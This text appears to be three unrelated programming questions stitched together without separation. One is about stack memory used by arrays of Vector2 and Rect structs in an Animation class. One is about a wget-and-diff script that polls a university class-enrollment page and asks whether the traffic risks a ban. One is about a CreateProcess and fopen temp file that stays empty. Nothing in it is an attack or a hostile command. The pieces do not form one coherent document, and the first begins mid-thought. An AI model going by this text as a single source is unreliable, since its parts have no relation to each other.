*I have  testing scenario set up, i know that using the plain old 4 Animation calls if i reduce the array of Vector2's & RectArray's to 15 instead of the 20 (*Just to say that these are simple structs, containing ints for the plain old x & y, and then for x, y, width & height*) the game compiles up fine(Which is most likely the main reason i'm leaning towards the Animation class being the issue), if i could measure how much stack memory that it is using and then compare that with what creating a vector array of animations uses, then i should hopefully by able to make a good call on whether or not this is more importantly the real issue or if it is infact something else.

I made a simple script to alert me when people drop classes that I want to add. The program runs a loop that calls *wget* on the webpage where my class sits, waits 5 seconds, calls *wget* again, and then uses *diff* to compare the two files created. If *diff* finds a difference in the files *wget* creates, my script emails me a notification. I can then view the notification on my phone, and run to a computer. What I need to know is will my university ban me for this extra traffic. I looked at the terms of service for the website, https://my.sa.ucsb.edu/gold/, and found nothing saying my script is illegal.

I start my Programm which contains this function. It creates a new process with `CreateProcess`. The programm called this way should write some data to ""FLM.tmp"". When it has finished, I call this funtion to read the data, written by the other programm. But it's always nothing. I also opened the file with the Windows explorer and there's also nothing. So I checked the other programm and this works definitely. Next I tried to change the Path of `fopen`in this function and let the path in the other Program stay the same and NOW it writes his data in ""FLM.tmp"". Its like that my prog opens this file before starting the new process and that it's blocking it. But I never opened this File in another part of my prog.
